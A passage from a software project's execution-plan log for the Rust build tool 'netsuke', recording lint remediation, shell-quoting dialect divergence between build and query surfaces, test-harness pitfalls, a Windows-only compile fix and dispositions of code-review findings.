  structural, not stylistic — extracting the two-event arm into
  `substitute_fallback(fallback: Option<String>) -> Result<String, Error>` and
  calling it from the outer match gives each lint a shape it accepts.
  Confidence: verified by `make lint` going green with no `#[expect]` added.
- Observation: Whitaker's `no_expect_outside_tests` keys off the **nearest
  enclosing function**, not the file's test-ness. An *asserting* helper in a
  `#[cfg(test)]` module is not a test, even when called only from `#[test]`
  bodies. Evidence: `src/manifest/tests/env_function.rs:60`,
  `assert_resolution` at its pre-fix revision, called from
  `default_substitutes_for_absence_only` and
  `empty_fallback_satisfies_an_absent_variable`. Impact: such a helper must
  compare values rather than unwrap them. Reducing the outcome to a local
  `Resolved` enum — `Value(String)` and `Failure(ErrorKind)` — both satisfies
  the lint and *improves* the failure message, because the assertion now prints
  the observed and wanted pair rather than a bare `expect` panic line.
  Confidence: verified.
- Observation: splitting a test file for the 400-line cap can **create** lint
  findings that the unsplit file did not have. `clippy.toml` sets
  `allow-expect-in-tests = true`, so `expect_used` is exempted by *enclosing
  function context*: the same call is allowed inline in a `#[test]` body and
  denied one frame away in a helper that body calls. Evidence: the split of
  `tests/manifest_env_tests.rs` moved one `expect_err` into a shared
  `ensure_template_is_rejected`, and clippy then flagged that line while
  leaving four identical `expect_err` calls in `#[test]` bodies in the *same
  file* unflagged; it also flagged `needless_pass_by_value` on a helper the
  split had just extracted. Impact: a mechanical split is not lint-neutral.
  Budget a lint run after one, and prefer a structural fix — take the parameter
  by reference, return the error and let the caller branch via `let … else` —
  over sprinkling `#[expect]`, which `clippy.toml` deliberately steers toward
  so that migrated sites re-warn once. Confidence: verified.

- Observation: **An example can be justified by a false premise and still read
  as considered.** The Purpose example chained its commands with `;` and the
  plan defended that at length, citing `docs/users-guide.md` on the Windows
  PowerShell contract and Windows PowerShell 5.1's lack of `&&`. The rationale
  was wrong twice. First, the example was never Windows-runnable: it opens with
  `RUSTFLAGS=... cargo build`, a POSIX prefix assignment PowerShell rejects,
  and it ends with `touch`. Second, `;` is *worse* than `&&` here regardless of
  platform, because it makes the recipe's exit status that of `touch`, so a
  failed `cargo build` still writes the stamp — the exact silent success the
  example exists to demonstrate avoiding. The review caught the symptom (no
  success guard) and proposed `&&`, which the plan had explicitly rejected, so
  the two could not agree until the premise itself was tested. The example now
  uses `&&`, is labelled POSIX-only, and names the PowerShell equivalents.
  General shape: a stated rationale is evidence about the author's reasoning,
  not about the world; when a finding conflicts with a documented decision, the
  decision's *premise* is the thing to check, not the decision's authority. The
  citation had also drifted — the quoted sentence is at
  `users-guide.md:365-366`, not `:333-339` — which is the same relative-anchor
  hazard recorded above.
- Observation: **A pervasive house convention can make a correct grammar
  finding look like a false positive, and the honest fix is narrower than
  either side proposed.** CodeRabbit flagged three locale lines where
  `{ $kind }` was the inflected object of a verb. The construction is real, and
  the placeholders render *English* kind names (`sequence`, `map`,
  `plain object`) spliced into every catalogue, so they can never agree with a
  target-language verb — the defect is structural, not stylistic. But the same
  construction appears throughout the pre-existing catalogues
  (`pl:77,157,185,232,371`, `cs:77,157,185`, `el:77,158,186`), so "fix the
  family" as the review's per-line reporting implies would rewrite a large body
  of upstream translation outside this milestone's remit. What was actually in
  scope: the six lines this branch *added* (the three flagged and their
  `default_not_string` siblings), switched to the label-and-colon form the same
  files already use for `clap-error-*`, which keeps `{ $kind }` in nominative
  position and preserves the placeholder the l10n audit enforces. Scope was
  settled by asking which lines the branch added, not which lines the review
  named.
- Observation: **A task-list item's continuation body is indented two spaces,
  not six, and at six it becomes an indented code block.** MD046 anchors on the
  *first* block style markdownlint sees, and this file's first code block is
  fenced, so every later indented block is a violation. For `- [x] text` the
  content column is 2, because the `[x]` is inline text rather than a list
  marker; a paragraph indented 6 is 4 beyond content, which CommonMark reads as
  an indented code block. The trap is that the *first* paragraph after the item
  escapes: it continues the item's own open paragraph lazily, so any
  indentation works and the construct looks fine. Only a paragraph that follows
  a blank line is re-evaluated as a new block, so the error surfaces not where
  the bad indentation is written but at the first blank-line-separated
  paragraph after it. Impact: the real file reported one error at line 2551,
  while isolated probe files of the identical *visible* shape passed with zero
  — the difference being that a probe with no preceding fenced block never
  establishes "fenced" as the house style, so `consistent` mode has nothing to
  compare against and the indented block is accepted. The probe has to contain
  the fence to be a probe. Verified by threshold: at 4 and 5 spaces the
  paragraph is a list continuation, at 6 and 7 it is a code block.

- Observation: **The plan's central query-surface premise is false — but so was
  the first correction of it, and the second error was the more instructive
  one.** The `ManifestLoadMode::ManifestQuery` section says the query surface
  "renders different quoting from the build for the same expression". The first
  reading of the code concluded that this was true on *no* host, because "both
  surfaces resolve through `RecipeShell::host_default`". That reading is wrong:
  it mistook the *default* for the *value actually used*. `StdlibConfig::new`
  does seed `dialect` from `host_default()` (`src/stdlib/config/mod.rs:109`),
  but the build path never keeps that seed — `src/runner/mod.rs:153` resolves
  the shell from `NETSUKE_WINDOWS_SHELL` and `src/manifest/query.rs:142` passes
  it to `with_recipe_shell`, which overwrites the field. The query surface has
  no such override: `register_query_helpers` calls
  `recipe_text::register_filters(env, RecipeShell::host_default().dialect())`
  directly (`src/stdlib/register.rs:199`). So on a Windows host with
  `NETSUKE_WINDOWS_SHELL=bash` the build quotes for `Sh` and the query for
  `PowerShell`, from the same expression — the divergence the plan originally
  asserted, and the one `register_query_helpers` and
  `ManifestLoadMode::ManifestQuery` each document as deliberate.

  **What the corrupted reading got right, and it is the half that matters.**
  The *hazard* the plan attached to the divergence — that resolving the shell
  on the query path would make `netsuke help targets` fail on a malformed
  `NETSUKE_WINDOWS_SHELL` — is the reason not to close the gap, and it is
  reachable only on Windows. On a non-Windows host `resolve_recipe_shell_with`
  returns `Posix` *before* it reads the environment, so the value cannot be
  malformed there; and on every host `execute_help` returns before
  `resolve_recipe_shell()` is reached (`src/runner/mod.rs:149-153`), so the
  query never resolves a shell at all. Measured on this (Linux) host:
  `netsuke --json help targets` under
  `NETSUKE_WINDOWS_SHELL=definitely-not-a-shell` exits 0 and renders
  byte-identically to the same query with the variable unset. That measurement
  is *consistent with both readings*, which is exactly how the error survived:
  it was taken as settling a question it cannot reach, because the
  `cfg!(windows)` early return makes the whole comparison vacuous here. The
  divergence is a Windows-only, configuration-dependent claim, and no test on
  this host can observe it.

  **Impact, and the correction.** `docs/developers-guide.md:145-158` already
  states the divergence correctly — "the difference is wider than 'the same
  value reached twice' … it is masked, not absent" — and
  `src/stdlib/register.rs:188-196` documents it as deliberate. What was wrong
  was this plan's `Surprises & discoveries` entry claiming they "agree on every
  dialect", and the test comment in `dialect_probes.rs` repeating it. Both are
  corrected to state the masked divergence. The general shape is worth keeping:
  a rationale that names a *mechanism* is testable, and this one was tested —
  but a test whose answer is fixed by an unrelated early return is not a test
  of the claim. The second lesson is the sharper one: a correction can be
  *more* confident than the original and still be wrong, so a claim about
  configuration must be traced to the value the code *uses*, not the value it
  is *initialized with*.
- Observation: **A probe that names its own input cannot detect a defect in the
  default.** `dialect=` overrides the registration's dialect outright, so a
  query probe written as `shell_quote(dialect='sh')` renders identically whether
  `register_query_helpers` is seeded with `Sh` or with PowerShell — all six
  fields of the first version of the probe passed 6/6 against a deliberately
  wrong seed. The fix is a *trio*: each expression is rendered three times,
  once with an explicit `sh`, once with an explicit `powershell`, and once with
  the dialect omitted, and the omitted field must equal the twin that the
  host's default selects. Two further bugs surfaced only once the seed was
  failing: a guard asserting the omitted field matches *neither* twin
  (inverted, and it fired on the correct tree), and a membership test
  (`default == sh || default == power_shell`) that is satisfied by the very
  seed it was meant to catch, because a wrong default *is* one of the twins.
  The working formulation mirrors `RecipeShell::host_default`'s own `cfg!` in a
  `const fn`, so the expected twin is chosen by the same predicate the product
  code uses rather than hardcoded to `sh` — which matters because
  `make SHELL=bash test` is a merge gate on `windows-latest`
  (`.github/workflows/ci-windows.yml`) and the file runs there. General shape:
  a negative control is only a control if the fault it seeds is on the path the
  assertion reads; where a keyword short-circuits configuration, the assertion
  must exercise the path where the configuration is *read*, and the expected
  value must come from the same predicate as the implementation's. Recorded
  because the first green run here was the false one.
- Observation: **The corresponding negative control in that file is weaker than
  it looks, and the review that found this is right about the gap and wrong
  about the fix.** `assert_full_stdlib_renders` renders the probe through a
  build and asserts only that the build *succeeds*. So it rules out two
  identical failures, which is what its doc says it is for — but not a build
  whose default dialect differs from the query's, which is the comparison the
  test's name implies. The agreement is carried entirely by the query-side
  assertion; the control contributes nothing to it. Closing the gap needs the
  build's *rendered text*, and the obvious place to read it is the target's
  `description:` — which does not work: a `command:` target's description is
  deliberately dropped, the source comment recording that "rule descriptions
  remain the sole source of Ninja progress text"
  (`src/ir/from_manifest.rs:137-141`), confirmed by generating a Ninja file
  from the probe manifest and finding no `description` line in it. A rule
  *does* emit one, measured the same way, so the probe can be moved onto a rule
  and the six fields compared directly. Not done in the review-fix commit that
  recorded this, because what it would pin is the Windows-only masked default
  that finding 12's entry is about — strengthening evidence for a claim no test
  on this host can reach is worth a deliberate change, not a comment tweak.
  General shape: a "negative control" that asserts a *sibling* operation
  succeeded is not a weaker version of the comparison, it is a different
  proposition, and it will be green for every wrong rendering the comparison is
  meant to catch.
- Observation: **An `.feature`-only edit does not rebuild the BDD harness, and
  the stale binary reports the *old* scenario text rather than failing
  outright.** `rstest-bdd-macros` 0.5.0 discovers feature files with `WalkDir`
  at macro-expansion time (`src/macros/scenarios/feature_discovery.rs:72`) and
  emits no `include_str!`/`include_bytes!` for them, so Cargo's dependency
  fingerprint contains no path under `tests/features` and
  `cargo nextest run --test bdd_tests` happily re-runs the previously compiled
  scenarios. This produced a long false diagnosis: the assertion was patched to
  `ZZPROBE`, then to a phrase that exists nowhere, and the run still reported
  the original generated step text — which reads exactly like a macro capture
  bug and is nothing of the kind. `touch tests/bdd_tests.rs` forces the rebuild
  and the new scenarios appear. Impact: any behavioural scenario added or
  edited in isolation must be preceded by a touch, or the red/green evidence is
  about the previous revision. It also means a *committed* feature file can be
  verified by a gate that never compiled it, so the touch belongs in the loop
  rather than in a remembered one-off.
- Observation: **The `{name:string}` step capture strips the surrounding
  quotes without unescaping anything, so a planned scenario written with `\"`
  is a MiniJinja syntax error rather than a quoted value.** The pattern is
  `r#""(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'"#`
  (`rstest-bdd-patterns-0.5.0/src/hint.rs:20`) and the generated code is
  `&raw[1..raw.len() - 1]`
  (`rstest-bdd-macros-0.5.0/src/codegen/wrapper/arguments/step_parse.rs:67`) —
  only the outer characters are removed, so a backslash-escaped quote inside a
  double-quoted capture reaches MiniJinja verbatim and raises
  `unexpected character`. The plan's scenario used exactly that form.
  Respelling the step with a single-quoted Jinja string and an escaped inner
  quote (`{{ 'a b \'$HOME\'' | shell_quote(dialect='sh') }}`) renders the
  plan's expected value verbatim: `a' b '\''$HOME'\'`. General shape: a hint's
  regex governs what the *capture* accepts, and stripping the delimiters is not
  unescaping; the two halves are separate mechanisms and only one of them
  exists. The same distinction is why the composition suite binds its values as
  template *variables* rather than splicing them into template source.
- Observation: **`shell_join`'s sequence error carries the `netsuke::jinja::`
  code that `compact`'s does not, and the difference is one call.** `compact`
  raises `STDLIB_COLLECTIONS_COMPACT_NOT_SEQUENCE` directly
  (`src/stdlib/collections.rs:122`), so its message is
  `compact expects a sequence, received …` with no bracketed code; `shell_join`
  raises the same-shaped message through `args_error`
  (`src/stdlib/recipe_text/mod.rs:76`), which wraps it as
  `[netsuke::jinja::shell::args] { $details }`. Both keys exist in all 35
  catalogues; only six entries in `locales/en-GB/messages.ftl` carry a
  `netsuke::` prefix at all, and `compact`'s is not one of them. Impact: the
  behavioural scenario for `compact` asserts on its English text while the
  `shell_*` scenarios assert on codes, which is not an inconsistency in the
  suite but a faithful reflection of two registration paths — and it is a
  latent trap for any future catalogue translation, since the `compact`
  assertion would have to change if that message ever gained a code. It is
  recorded rather than "fixed" because adding a code to an existing,
  long-shipped collections message is a diagnostic-contract change outside this
  milestone's remit: `flatten` sits beside it in the same file and would have
  to move too, or the two would disagree.
- Observation: **Three of the composition suite's premises were false, and the
  suite is more useful for having lost them.** (1) PowerShell command lists do
  not use `eval`: the `eval` wrapper is produced by `command_evaluator`/
  `shell_single_quote` in `src/ninja_gen_command_list.rs` and PowerShell does
  not reach that renderer, so the assertion that `Invoke-Expression` is
  *absent* is the one that holds — a first draft asserted eval on all three
  transports and would have encoded a renderer behaviour that does not exist.
  (2) The filter refuses an inadmissible value *before* any Ninja guard sees
  it, so the control asserts on the `netsuke::jinja::shell::unquotable` code at
  the template rather than expecting the downstream checker to catch a line
  feed later. (3) The three `RecipeShell` variants are three *transports*, not
  three interpreters — `Posix` runs the text directly, `Bash` wraps it in
  `bash.exe -e -c "…"`, and `PowerShell` base64-encodes it for
  `-EncodedCommand` — so only the `Posix` arm is executable on this host and
  the other two are asserted on transport shape, with the `Bash` payload
  additionally *decoded* back to its inner script and run under the host's own
  POSIX shell. General shape: "compose it and run it" is only an end-to-end
  test for the arm whose end is reachable; for the others the honest obligation
  is that the payload survives the encoding, and stating which arm executes is
  what keeps the suite from claiming coverage it does not have.

- [x] (2026-09-27) EP-M4 test-suite lint remediation, and the EP-M5
  reconnaissance recorded before starting it.

  `fdc5ff8f` fixed the seven clippy errors the first `make lint` reported, but
  that output was truncated mid-stream. A full capture showed **31**, across
  three targets rather than one — the property suite, the composition suite,
  and the query suite. Two of the three had never been linted at all, because
  `lint-clippy` aborts at the first failing crate and the property suite was
  the one it happened to compile first. `93b4ce1b` clears them: 13
  `panic_in_result_fn` converted to `ensure!`, five `print_stderr` skip
  messages funnelled through one `#[expect]`-carrying helper, five
  `format_collect` folds, the PowerShell transport decode rewritten to mirror
  the production decoder in `ninja_gen_recipe_shell.rs`, `is_multiple_of` and
  `>> 1` where `/` and `%` are denied outright, and a `std::fs` read that
  Whitaker rejects as bypassing the capability policy. Verified by `make lint`
  and `make check-fmt` passing and the three targets running 63/63 with nothing
  skipped.

  **EP-M5 reconnaissance.** The milestone is untouched: no `adr-041`, no doc
  edits, `shell_escape` still appears at 13 sites. Several of the milestone's
  own citations are stale, and one of its items has already been discharged by
  an earlier milestone:

  - Item 4's `docs/netsuke-design.md:687-688` now lands in the "Execution
    feedback" prose, which is unrelated; the `shell_escape` at `:728` is the
    real target and the plan's own instruction to "re-locate by content" is what
    saves it.
  - Item 15's `docs/roadmap.md:343-356` and `:1162-1169` have drifted to
    `365-382` and `1185-1196`.
  - Item 5's `docs/users-guide.md:489-491` has drifted to `:518`.
  - Item 2 — the `env(name, default=…)` contract for §4.4 — is **already
    shipped**: EP-M1 landed `env_default_from_kwargs` in
    `src/manifest/registration.rs`, keyed on `MANIFEST_ENV_DEFAULT_NOT_STRING`.
    The design-doc rewrite still has to describe it; nothing has to be built.
  - Item 9's env-substitution counter is the one item the plan itself invites
    dropping ("if that sentence cannot be written, drop the counter and record
    the decision"). The reason to drop it is legible: the counter would be
    admitted by `accepts_name`/`accepts_counter_registration`, so it would
    *pass* every gate while measuring nothing an operator can distinguish from
    "no substitutions happened" — `record_env_lookup` already counts every
    lookup as `success`, and EP-M1's `tracing::debug!` already records each
    substitution individually. Decision: drop it, ship the
    `shell_quote_dialect_total` counter, record the reasoning here.
  - The `tested-example` markers are scanned in exactly three files
    (`tests/documentation_examples/mod.rs`, the `DOCUMENTS` list), so item 7's
    new example belongs in `docs/stdlib-yaml-and-jinja-guide.md`, which is
    already one of them.

  `Blocked / open questions` below still cites the `149685d3` gate table. That
  table is a historical record of an earlier plateau, not the current HEAD; the
  run for `93b4ce1b` is in flight and will be recorded in its own entry rather
  than overwriting it.

- [x] (2026-09-27) The Windows-only compile break that no Linux gate could
  see, found while requesting the EP-M4 review.

  Scrutineer ran `coderabbit review --agent` against base `ebcedaef` at head
  `83981593` and returned ten findings. While capturing the CodeRabbit check
  status it incidentally found **CI was red at that exact head**: run
  `36290229944` failed `Windows / lint-windows` and
  `Windows / build-test-windows`, both with
  `E0425: cannot find function quote in this scope` at
  `src/stdlib/command/child_argument.rs:156` and `:169`. This branch's rename
  (`R080`, `quote.rs` to `child_argument.rs` and `quote` to
  `quote_child_argument`) updated both definitions and the non-Windows test
  module but missed the `#[cfg(all(windows, test))]` module below them, which
  called bare `quote` twice. Fixed in `45b2fd87`.

  **No gate in the seven-target set could see it.** The module is
  `cfg(windows)`, so `make lint` (clippy and both Whitaker passes) and
  `make test` never compile it; `check-fmt` is the only gate that even parses
  it, and rustfmt does not resolve names. The earlier "all seven gates green"
  verdict was therefore accurate and still said nothing about this code. The
  gate set is Linux-complete, not platform-complete, and the recorded
  consequence is that a green seven-gate run must not be reported as "CI will
  pass".

  Verified by two **liveness-checked** oracles. A green run from an unprobed
  oracle is void, so each was first shown to reproduce the defect:

  1. A standalone probe crate compiling `child_argument.rs` verbatim under
     `--target x86_64-pc-windows-msvc --all-targets`. Against the unpatched
     file it reproduces CI's two `E0425`s exactly; against the patched file it
     exits 0. The liveness direction is what makes the green direction mean
     anything.
  2. The real crate with `#[cfg(all(windows, test))]` rewritten to
     `#[cfg(test)]` and the complementary arms inverted, so the Windows module
     compiles on Linux. An injected call to a nonexistent function is caught;
     the unmodified file compiles clean under `-D warnings`.

  This matches the recorded note that `netsuke` cannot be cross-compiled here
  (`ring`'s build script fails for want of `lib.exe`, before this crate is
  reached), so forcing the gate is the local substitute, and for this purpose
  it is strictly better than the cross-check because it reaches `cfg(windows)`
  test code that a cross-check of the library would not.

  A sweep of the whole PR diff found no second instance: the diff contains two
  renames, the other being a test-file split, and no other changed file has a
  cfg-gated module.

  **Consequence for EP-M5.** The CodeRabbit findings are documentation and
  test-size work, but the CI failure outranked them and was fixed first. The
  review's own findings are recorded in `Blocked / open questions`.

- [x] (2026-09-27) EP-M5 items 9-11 closed, and the `6719ddcb` gate run
  cleared. This entry records the four gate defects and their repairs, the
  item-9 counter decision, and the documentation work that was still open.

  **Item 9 — the env-substitution counter is dropped, and the decision is
  final.** `netsuke_manifest_shell_quote_dialect_total` shipped (four label
  combinations, admitted by `src/observability_recorder.rs`). The second
  counter the item named, `netsuke_manifest_env_default_substituted_total`,
  never shipped and must not: `substitute_fallback`
  (`src/manifest/env_reader.rs`) already records `OUTCOME_SUCCESS` *and* emits
  `tracing::debug!(fallback_used = true, …)`. The plan's own escape clause
  applies — the one-sentence test cannot be met, because the `success` series
  already counts every substitution and the debug event already marks each one,
  so a dedicated counter would be no more distinguishable from "no
  substitutions happened" than that existing pair. A third option (re-labelling
  `success` with a `default=` source) was rejected because
  `src/manifest/env_telemetry.rs`'s module doc forbids promoting the
  substituted default to a fifth outcome.

  **The four gate defects, all repaired.** Detail and evidence are in
  `Blocked / open questions`; in brief: a private-intra-doc-link error that
  failed both `make lint` and `make doc-coverage` (one edit, two gates); the
  `shell_join` test cases binding a scalar where the filter requires a sequence;
  `hand-written` against an existing `typos.toml` entry; and an `mdtablefix`
  reflow over five Markdown files.

  **Two documentation defects in this branch's own earlier work, now
  corrected.** Both were in `docs/developers-guide.md` and both were claims the
  source did not support:

  1. The guide asserted the build and query surfaces "agree on every dialect".
     They do not. The query surface takes `RecipeShell::host_default()`; the
     build surface takes the shell the runner resolves, which on Windows
     honours `NETSUKE_WINDOWS_SHELL`. A Windows host configured for Bash
     renders `sh` quoting for the build and PowerShell quoting for
     `help targets` from one manifest expression. The divergence is
     *masked*, not absent: `execute_help` returns before
     `resolve_recipe_shell()` is reached. `register_query_helpers` and
     `ManifestLoadMode::ManifestQuery` each document it as deliberate, so the
     guide was contradicting the code's own stated intent. The corrected
     paragraph now separates what is true (explicit dialects agree on every
     host) from what is not (the defaults).
  2. The guide promised "a seeded-fault check that a wrong default dialect in
     `register_query_helpers` is caught". No such mechanism exists:
     `tests/stdlib_manifest_query_tests.rs` has six tests and none seeds a
     fault. The seeded run was a **manual, one-time experiment** recorded in
     `Surprises & discoveries`. The guide now describes what the tests
     actually do — the dialect-*omitting* probes trip a wrong default, and
     `host_default_field` mirrors the product `cfg!(windows)` so the file
     still runs under `make SHELL=bash test` on Windows.

  **Items 10 and 11 completed.** The guide gained the POSIX round-trip clause
  (one word is a promise about the shell: for `dialect='sh'` a POSIX shell
  splitting the output yields exactly one field byte-identical to the input,
  discharged against a real `sh` by the property suite) and the `select`
  contrast in the `compact` bullet. Verified against the vendored MiniJinja
  2.24.0 rather than assumed: `select_or_reject` filters on `is_true()`, so it
  drops `0`, `false`, and empty sequences — which is exactly the contrast. The
  developers guide gained the three remaining conventions: the
  both-registration-surfaces rule, the D8 `Value::try_iter()`-is-not-a-
  sequence-check rule, and the argument-style rule (trailing `Option<T>` for
  options reading naturally in a fixed order, `Kwargs` for independent named
  options and widening enumerations). The 35-catalogue and verbatim-bracketed-
  code rules were already present in "Adding or changing messages"
  (`docs/developers-guide.md:353-368`) and were deliberately not duplicated.

- [x] (2026-09-27) Second repair pass: the two defects the cascade had masked,
  plus a branch-wide spelling sweep. Detail is in `Blocked / open questions`.
  Ticked after re-verifying the described end state still holds at `c3078c1f`
  rather than on the strength of the entry's own prose: `recorded_render` is
  `src/observability_recorder_dialect_tests.rs:38` and genuinely returns
  `Result<Vec<SnapshotEntry>>`, propagating its three fallible steps with `?`,
  with each caller unwrapping at its own call site inside a recognized test
  function. Note the helper lives under `src/`, not `tests/`, because it is a
  `#[path]`-included test module — a `tests/`-scoped grep finds no trace of it,
  which is the likely reason the box was left unticked.

  **The cascade mask, now measured twice.** `make lint` aborts at the first
  failing stage, so the `cargo doc` failure at `6719ddcb` concealed *two more*
  lint errors behind it — a `clippy::excessive_nesting` and three Whitaker
  `no_expect_outside_tests` errors. Both surfaced only once `cargo doc` was
  repaired. The operative rule for this branch: a gate's problem count is a
  **lower bound**; only a fully green `make lint` shows the stage list was
  exhausted. Do not treat "I fixed everything the gate printed" as "the gate
  will pass".

  **The Whitaker rule is attribute-based, not module-based.** It recognizes a
  function as test-like solely by its attribute (`#[test]`, `#[rstest]`, and a
  fixed path list in
  `/home/leynos/.local/share/whitaker/common/src/attributes/mod.rs:11-22`). An
  enclosing `#[cfg(test)] mod tests` does **not** make a helper test-only. So
  the fallible setup must live in the recognized function body, or the helper
  must propagate `Result`. Chosen here: `recorded_render` returns
  `anyhow::Result<Vec<SnapshotEntry>>` and propagates with `?`; each of its
  three call sites unwraps inside its own `#[rstest]`/`#[test]`. That matches
  the sibling modules, which contain zero `expect(` calls.

  **Spelling sweep.** Five genuine `-ise` instances in this branch's own delta
  were repaired, and two classes were deliberately kept — `localised` in
  `tests/features/*.feature`, which four pre-existing scenarios already use,
  and the deliberate `defualt` typo under test in
  `tests/manifest_env_tests/default_argument.rs`. The full sweep and the
  reasoning are in `Blocked / open questions`.

- [x] (2026-09-27) Rebase onto `96b89ca9`, the seven gates green at `338df305`,
  and the review findings dispositioned. This entry is the record of the
  post-review repair pass; the dispositions are itemized so a later reader can
  re-check them without replaying the review.

  **The rebase and what it cost.** Forty-three commits replayed onto
  `origin/main` at `96b89ca9`. Exactly one conflict, in `docs/users-guide.md`,
  in two regions. Both were resolved by keeping this branch's text, because
  main's side of each hunk was the *pre-3.14.8* prose ("The `shell_escape`
  filter described in … is not implemented in beta3", "Beta3 does not accept a
  default argument") — the very sentences `RM-3.14.8` names as the defect.
  Main's unrelated edit in that file, `beta3` → `beta4` at the version
  headings, was in disjoint regions and survived intact. That was checked
  rather than assumed: 11 `beta4` occurrences, and one deliberately historical
  `beta3` in the note describing the *older* release.

  **Rebase-before-gate ordering matters, and it is the reverse of the intuitive
  one.** The pre-rebase gate run was void the moment the replay landed, so the
  gates were re-run on `338df305` *before* any finding repair was committed.
  That ordering is deliberate: it separates "this branch is green on current
  main" from "this branch is green with the review fixes", so a failure in the
  second run cannot be mistaken for a rebase artefact. All seven reported PASS
  at `338df305`.

  **The PR was `CONFLICTING`, and a conflicting PR runs no CI at all.** No
  workflow run existed for the pre-rebase head `a2311ee7`; the push that
  cleared the conflict was immediately followed by three runs for `338df305`.
  "Queued" and "no runs yet" are different states, and only `mergeable`
  distinguishes them.

  **Finding dispositions.** Eight findings; four genuine, four refused on
  evidence. The four genuine ones shared a shape worth naming: each was a case
  where code did something *reasonable-sounding* that the module's own doc
  comment, or the RFC it cites, forbids.

  1. **`resolve_dialect` silently stringified a non-string dialect — FIXED.**
     `kwargs.get::<Option<String>>` routes through `MiniJinja`'s `String`
     conversion, which `to_string`s a number or boolean, so
     `shell_quote(dialect=3)` became the dialect named `"3"` and failed as
     *unknown* rather than as the wrong *type*. RFC 0006 §6.6 forbids exactly
     this: "A helper that expects a string rejects numbers and booleans rather
     than stringifying them." It is now read as `Option<Value>` and
     type-checked explicitly, mirroring `env_default_from_kwargs` in
     `src/manifest/registration.rs` — the same D4 concern, already solved the
     same way by commit `e453322c`. The non-string case gets a **dedicated
     key**, `stdlib.shell.dialect_not_string`, added across all 35 catalogues;
     folding it into `dialect_invalid` would tell the reader the name was
     misspelled when the argument's *type* was wrong. The precedent for a
     dedicated key is `manifest.env.default_not_string`, added for the
     identical reason.
  2. **`compact` dropped an empty byte array — FIXED.** `is_blank` asked
     `Value::as_str`, which answers for well-formed UTF-8 *bytes* as well as
     for strings (`value/mod.rs:1307-1314`: `ValueRepr::Bytes(b) =>
     str::from_utf8(b).ok()`), so `Value::from_bytes(vec![])` reported
     `Some("")` and was discarded on the strength of a text rule that does not
     apply to it. The predicate now tests `ValueKind::String` first, which is
     the rule its doc comment already claimed, and a test pins it. The
     current unreachability is stated in the doc rather than relied on:
     `value_from_bytes` normalizes empty bytes, so nothing constructs such a
     value today — but the predicate should state what it means, not what
     happens to arrive.
  3. **`property_support::posix_shell`'s doc described the wrong algorithm —
     FIXED.** The comment claimed the well-known absolute paths are consulted
     *after* a `PATH` lookup. The code does no `PATH` lookup at all; not
     consulting `PATH` is the point of it. A doc describing a different
     algorithm than the code runs is worse than no doc, because it is read as
     authoritative.
  4. **The Gaelic term for "keyword" was wrong — FIXED.**
     `stdlib.shell.positional_option` said `fhacal-àirde`, "loud word", not
     "keyword". Settled against the glossary's own cited authority rather than
     by opinion: Am Faclair Beag attests `facal-luirg` = "keyword" in the
     IT/computing sense, so the catalogue now uses it and the glossary gained
     the row recording the attestation.

  **Refused, with the evidence that refuses them.** Three findings asked for
  catalogue changes on the strength of the reviewer's reading of the target
  language. Each was checked against its own file, and each was contradicted by
  that file's *pre-existing* text: for Scottish Gaelic, Hindi, Indonesian, and
  Korean, the flagged wording in the new string matched the same catalogue's
  existing `stdlib.command.quote.line_break` rendering on `origin/main`, and
  Korean's `열` additionally matched the existing `flatten` and `compact`
  strings. The styleguide requires the opposite of the finding — quality
  checklist item 5, "Message families remain parallel … renders identically
  across the family" — so changing one member to satisfy one reading would have
  broken the parallelism the styleguide mandates. The change was refused and
  the reason recorded rather than silently dropped. Only the Gaelic item
  survived that test, and it survived as a genuinely *new* error, not as a
  parallelism break.

  **One finding was already fixed.** The `recognise` → `recognize` item in
  `compact_property.rs:91` had been corrected on an earlier pass; the review
  thread was reading a stale revision. Re-checked in the working tree, not
  assumed from the thread's state.

  **Liveness of both behaviour fixes was proved, not argued.** Reverting the
  `is_blank` guard made the new byte-array test fail with "the surviving length
  was 0"; reverting `resolve_dialect` made both new BDD scenarios fail. Both
  were then restored and re-verified green. A test never seen to fail is a
  hypothesis about the code, not evidence about it.

  **A note on the localized-key cost.** Finding 1 is the only one that grew the
  catalogue surface, by one key across 35 files. That cost is real and was
  accepted deliberately: the alternative — reusing `dialect_invalid` — keeps
  the catalogue smaller while making the diagnostic lie about which mistake the
  author made. Two diagnostics a reader acts on differently should not share a
  message.

  **Two Gherkin assertions were rewritten rather than a step invented.** The
  first draft of the type-error scenarios asserted the message did *not*
  contain "powershell". No such step exists — `tests/bdd/steps/stdlib/` has only
  `the stdlib error contains {expected:string}` — so the assertion became
  `contains "must be a string"`, which is stronger anyway: it proves the
  type-error path was taken, whereas the absence of "powershell" would also
  hold if the filter had failed for some unrelated reason.

  **The first gate run after the repair pass was red, on two defects in this
  branch's own new material.** Recorded rather than quietly repaired, because
  both are instances of traps this plan has already named, and the second
  instance is the more instructive one.

  1. `make check-fmt` failed at `cargo fmt --all -- --check` on
     `tests/std_filter_tests/collection_filters/compact_tests.rs:56` — the new
     byte-array test's `render_str` call fits 80 columns as written but rustfmt
     still breaks it into a multi-line call, so "it looks fine" is not the
     same test as "rustfmt agrees".
  2. `make markdownlint` failed in its `spelling` **prerequisite**, not in
     `markdownlint-cli2`: two words in the new ExecPlan prose carried the
     en-GB `-ise` inflection where this project's tooling requires `-ize` —
     the past participle of *itemize*, and the third-person form of
     *normalize*. Both were this branch's own added lines, in the paragraph
     describing the byte-array fix, not inherited text. The fix is the `-ize`
     spelling in each case, per the en-GB-oxendict rule.

  **Both failures masked work that was never run, and that is the point worth
  carrying.** `check-fmt` aborted inside its first command, so
  `ruff format --check` and `mdtablefix --check` did not execute.
  `markdownlint` aborted in `spelling`, so `markdownlint-cli2` never ran
  against *any* Markdown file — which means the Markdown-lint verdict for this
  revision was **unknown**, not passed, and it had been unknown for the whole
  branch. Neither gate's failure says anything about the stages behind it. The
  general rule this plan keeps rediscovering: a gate that aborts reports a
  lower bound on the work remaining, and the correct reading of "one gate
  failed" is "the stages after the failure are unmeasured".

  **A note on the spelling gate's tolerance, verified rather than assumed.**
  The gate flagged exactly two forms, while the same added prose contains
  `recognise`, `recognises`, and `localised` — so the gate is not a blanket
  `-ise` scanner. It is `typos-config-builder gate`, which regenerates
  `typos.toml` from the estate configuration; `recognise` and its inflections
  are tolerated there (`typos.toml:2169-2173`), which is why the citation of
  the reviewer's `recognise` → `recognize` suggestion inside this very
  paragraph does not itself red the gate. Reading the gate as "any `-ise`
  fails" would have produced three unnecessary edits; reading it as "whatever
  the regenerated config says fails" produced exactly two.

